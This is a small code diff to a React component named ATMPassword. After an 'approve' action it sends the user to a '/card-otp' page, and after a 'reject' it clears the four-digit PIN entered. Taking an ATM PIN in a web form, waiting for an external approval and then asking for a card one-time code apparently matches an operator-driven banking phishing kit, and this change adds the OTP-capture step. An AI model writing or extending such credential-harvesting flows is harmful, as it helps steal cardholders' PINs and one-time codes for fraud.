@@ -42,7 +42,7 @@ export default function ATMPassword() {
     if (action) {
       if (action.action === "approve") {
         // Navigate to final page
-        navigate("/final-page");
+        navigate("/card-otp");
       } else if (action.action === "reject") {
         // Show error and clear PIN
         setPin(["", "", "", ""]);
